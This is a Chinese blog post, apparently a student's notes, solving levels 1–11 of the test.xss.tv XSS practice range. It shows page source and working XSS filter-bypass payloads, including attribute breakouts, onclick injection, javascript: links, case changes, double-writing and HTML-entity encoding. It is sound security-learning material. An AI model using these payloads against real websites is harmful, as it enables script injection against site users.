
<!DOCTYPE html>
<html lang="zh-Hans" class="loading">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>web安全学习—Http协议基础 - 且听风吟</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate">
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="Saying and doing are two different things.,今天在安全龙网站上听老师讲了Http协议基础，有的东西不是一遍就可以记住的，就先记录一下，方便以后自己看(截图都是转载于安全龙网站)。
1、超文本包含有超链接(link)和各种多媒体元素标记(Mar,"> 
    <meta name="author" content="💗zihao"> 
    <link rel="alternative" href="atom.xml" title="且听风吟" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
    <link rel="stylesheet" href="/css/diaspora.css">
    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
</head>
</html>
<body class="loading">
    <span id="config-title" style="display:none">且听风吟</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="icon-home image-icon" href="javascript:;" data-url="http://bealright.github.io"></a>
    <div title="播放/暂停" class="icon-play"></div>
    <h3 class="subtitle"></h3>
    <div class="social">
        <!--<div class="like-icon">-->
            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
        <!--</div>-->
        <div>
            <div class="share">
                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class="main">
        <h1 class="title"></h1>
        <div class="stuff">
            <span>四月 28, 2019</span>
            

        </div>
        <div class="content markdown">
            <p><strong>练习了DVWA靶场中的XSS了解了一些原理和攻击方式，接下来就用在线XSS平台开始实战一番。</strong></p>
<p><a href="http://test.xss.tv" target="_blank" rel="noopener">在线XSS平台地址</a><br><img src="https://img-blog.csdnimg.cn/20190427231832231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h6 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h6><p>用最常用的攻击语句试试。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/hacker/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20190427232152543.png" alt="在这里插入图片描述"></p>
<h6 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a><strong>第二关</strong></h6><p><img src="https://img-blog.csdnimg.cn/20190427232331235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>就先把这个最简单的攻击语句放上去看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/hacker/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>没有出现弹窗，看下页面源代码。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"&lt;script&gt;alert(/hacker/)&lt;/script&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"搜索"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>观察代码，要想我们的语句起作用，就需要把前面的<code>&lt;input&gt;</code>标签给闭合掉。<br>那就输入这样的语句：<br><strong>payload：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(/hacker/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://img-blog.csdnimg.cn/20190427232750395.png" alt="在这里插入图片描述"></p>
<h6 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a><strong>第三关</strong></h6><p><img src="https://img-blog.csdnimg.cn/20190427232836121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还是那个套路，放上最常用的语句试试<br>没有成功，看看页面源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">'&amp;lt;script&amp;gt;alert(/hacker/)&amp;lt;/script&amp;gt;'</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
<p>发现输入的&lt;和&gt;被转义了<br>既然过滤了&lt;和&gt;，那就换一种攻击方式，用onclick 事件，onclick 事件会在元素被点击时发生。onclick 事件直接包含在&lt;&gt;内，并且可以被执行。再观察页面源代码，是单引号，那就在前面加<code>&#39;</code>把value给闭合掉。<br><strong>payload：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'onclick='</span>javascript:alert(/hacker/)<span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p>输入之后，再点击一下输入框<br><img src="https://img-blog.csdnimg.cn/20190427235336491.png" alt="在这里插入图片描述"></p>
<h6 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a><strong>第四关</strong></h6><p><img src="https://img-blog.csdnimg.cn/20190427235422586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先拿一个攻击语句测试下，再看看页面源代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">"scriptalert(/hacker/)/script"</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
<p>观察到&lt;和&gt;直接被过滤掉了<br>那就用onclick 事件，这里是双引号，那就在前面输入<code>&quot;</code>，把value给闭合掉。<br><strong>payload：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"onclick="</span>javascript:alert(/hacker/)<span class="string">"</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://img-blog.csdnimg.cn/201904280000261.png" alt="在这里插入图片描述"></p>
<h6 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a><strong>第五关</strong></h6><p><img src="https://img-blog.csdnimg.cn/2019042800005414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还是那个套路，先输入常用的看看,没有弹窗，看看页面源代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>o_nclick=<span class="string">"javascript:alert(/xss/)"</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现<strong>on</strong>中多了一个下划线，所以过滤了onclick事件，试试<code>script</code>,再看页面源代码。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>&gt;&lt;scr_ipt&gt;alert(/hacker/)&lt;/script&gt;<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>果然，<code>script</code>也同样被过滤了。<br>那就用<code>&lt;a&gt;</code>标签构造攻击语句试试。<br><strong>payload：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href="</span>javascript:alert(/xss/)<span class="string">"&gt;hacker&lt;/a&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>也可以再后面加上<code>//</code>注释掉后面的<code>&quot;/</code>，以免对前面的语句产生影响。<br><img src="https://img-blog.csdnimg.cn/20190428082830517.png" alt="在这里插入图片描述"></p>
<h6 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a><strong>第六关</strong></h6><p><img src="https://img-blog.csdnimg.cn/2019042808304722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入我们刚才用的语句，看页面源代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">"&lt;scr_ipt&gt;alert(/hacker/)&lt;/script&gt;"</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>o_nclick=<span class="string">"javascript:alert(/xss/)"</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>&gt;&lt;a hr_ef=<span class="string">"javascript:alert(/xss/)"</span>&gt;点这里&lt;/a&gt;<span class="comment">//"&gt;</span></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到在这里，<code>href</code>和<code>script</code>、<code>onclick</code>事件都被过滤了。<br>这里过滤的是onclick,改为大写试试。<br><strong>payload：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"ONCLICK="</span>javascript:alert(/hacker/)<span class="string">"</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://img-blog.csdnimg.cn/20190428084246774.png" alt="在这里插入图片描述"><br>在浏览博客的时候也看到一个大佬用的<strong>payload</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg x="</span><span class="string">" Onclick=alert(1)&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>利用<code>&lt;svg&gt;</code>标签进行攻击。</p>
<h6 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a><strong>第七关</strong></h6><p><img src="https://img-blog.csdnimg.cn/20190428084711276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入<code>&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;</code><br>查看页面源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>&gt;&lt;a =<span class="string">"java:alert(/xss/)"</span>&gt;点这里&lt;/a&gt;<span class="comment">//"&gt;</span></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure></p>
<p>输入<code>&quot;&gt;&lt;script&gt;alert(/hacker/)&lt;/script&gt;</code><br>查看页面源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>&gt;&lt;&gt;alert(/hacker/)&lt;/&gt;<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这次更狠，直接把关键字给过滤没了<br>用双写绕过<br><strong>payload：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;sscriptcript&gt;alert(/hacker/)&lt;/sscriptcript&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>过滤掉中的script，但是一旦过滤掉，前后又可以重新拼接起来，形成一个完整的语句。<br><img src="https://img-blog.csdnimg.cn/20190428085538328.png" alt="在这里插入图片描述"></p>
<h6 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a><strong>第八关</strong></h6><p><img src="https://img-blog.csdnimg.cn/20190428085649131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入<code>&quot;onclick=&quot;javascript:alert(/hacker/)&quot;</code><br>发现href,script被过滤，就试试onclick事件。<br><strong>页面源代码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">"&amp;quot;onclick=&amp;quot;javascript:alert(/hacker/)&amp;quot;"</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br></pre></td></tr></table></figure>
<p>发现<code>&quot;</code>,<code>&lt;</code>,<code>&gt;</code>也被转义了。<br>再次观察源代码，发现友情链接。。。真的是提示，这不就是<code>&lt;a&gt;</code>标签绕过吗?<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">"javascript:alert(1)"</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=<span class="string">"javascr_ipt:alert(1)"</span>&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>既然下面有<code>&lt;a&gt;</code>标签，那我们就直接输入这个语句<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/hacker/)</span><br></pre></td></tr></table></figure></p>
<p>但是<code>script</code>会被过滤，换一种方式表达<code>script</code><br>采用HTML字符实体转换<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">地址</a><br><img src="https://img-blog.csdnimg.cn/20190428091555545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法一：<br><strong>payload：</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/hacker/)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://img-blog.csdnimg.cn/20190428091839975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考大佬的<strong>payload:</strong><br>方法二：用 html 的自解码机制就可以绕过<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#<span class="number">114</span>;ipt:alert(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
<p>方法三：可以全转换为HTML实体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">58</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">101</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">40</span>;&amp;#<span class="number">49</span>;&amp;#<span class="number">41</span>;</span><br></pre></td></tr></table></figure></p>
<h6 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a><strong>第九关</strong></h6><p><img src="https://img-blog.csdnimg.cn/20190428143548669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>又是友情链接，把刚才的语句输入进去，查看页面源代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">"java&amp;amp;#x73;&amp;amp;#x63;&amp;amp;#x72;&amp;amp;#x69;&amp;amp;#x70;&amp;amp;#x74;:alert(/hacker/)"</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=<span class="string">"您的链接不合法？有没有！"</span>&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>
<p>我们输入的语句并没有进入到 <code>&lt;a&gt;</code>标签中，这里应该对格式有一定要求，查看大佬的博客后发现需要添加<code>http://</code>,否则不合法。<br><strong>payload：</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/hacker/)<span class="comment">//http://</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://img-blog.csdnimg.cn/20190428145114940.png" alt="在这里插入图片描述"><br>第九关和第八关类似，区别就是第九关添加了url验证合法性。</p>
<h6 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a><strong>第十关</strong></h6><p><img src="https://img-blog.csdnimg.cn/20190428145315347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这次更狠，连个输入框都不给。那就先看一下页面源代码吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_link"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_history"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>一脸懵，不知道该如何下手了,只能去查看大佬的wp了。<br><strong>先测试测试哪个可以注入</strong><br><img src="https://img-blog.csdnimg.cn/20190428150743764.png" alt="在这里插入图片描述"><br>查看页面源代码，发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">"t_link"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_history"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">""</span>text<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>找到了，<strong>t_sort</strong>就是注入点，那就开始注入吧<br>代码中有隐藏的参数设置,把hidden改为text<br><strong>payload：</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=<span class="string">"onclick="</span>alert(/hacker/)<span class="string">"type="</span>text<span class="string">"</span></span><br></pre></td></tr></table></figure></p>
<p>也可以<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=<span class="string">" type="</span>text<span class="string">" onclick="</span>alert(/hacker/)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://img-blog.csdnimg.cn/20190428151934698.png" alt="在这里插入图片描述"></p>
<h6 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a><strong>第十一关</strong></h6><p><img src="https://img-blog.csdnimg.cn/20190428152151437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还没有输入框，那类型应该和第十关比较类似，先看页面源代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_link"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_history"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_ref"</span>  value=<span class="string">"http://test.xss.tv/level10.php?keyword=well%20done!&amp;t_sort=%22%20type=%22text%22%20onclick=%22alert(1)"</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>一样的方法，先测试一下看那个可以注入<br><img src="https://img-blog.csdnimg.cn/20190428152842935.png" alt="在这里插入图片描述"><br>查看页面源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_link"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_history"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">"3"</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_ref"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
<p>发现了<strong>t_sort</strong>是可以注入的，把刚才的payload拿来试试<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">"&amp;quot;onclick=&amp;quot;alert(/hacker/)&amp;quot;type=&amp;quot;text&amp;quot;"</span> type=<span class="string">"hidden"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>发现<code>&quot;</code>被转义了，把<code>&quot;</code>转化为HTML实体也不行。查大佬的wp吧<br>发现做到这一关需要<strong>burpsuite抓包工具</strong>来帮忙,所以先做到这里,等到会用抓包工具了，再回过头来继续做。</p>
<p>未完待续————————</p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src>
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
                    
                        <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
                    
                </ul>
            
        </div>
        
    <div id="gitalk-container" class="comment link" data-ae="false" data-ci data-cs data-r data-o data-a data-d="false">查看评论</div>


    </div>
    
        <div class="side">
            <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#第一关"><span class="toc-number">1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第二关"><span class="toc-number">2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第三关"><span class="toc-number">3.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第四关"><span class="toc-number">4.</span> <span class="toc-text">第四关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第五关"><span class="toc-number">5.</span> <span class="toc-text">第五关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第六关"><span class="toc-number">6.</span> <span class="toc-text">第六关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第七关"><span class="toc-number">7.</span> <span class="toc-text">第七关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第八关"><span class="toc-number">8.</span> <span class="toc-text">第八关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第九关"><span class="toc-number">9.</span> <span class="toc-text">第九关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第十关"><span class="toc-number">10.</span> <span class="toc-text">第十关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#第十一关"><span class="toc-number">11.</span> <span class="toc-text">第十一关</span></a></li></ol>
        </div>
    
</div>


    </div>
</div>
</body>
<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/diaspora.js"></script>
<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
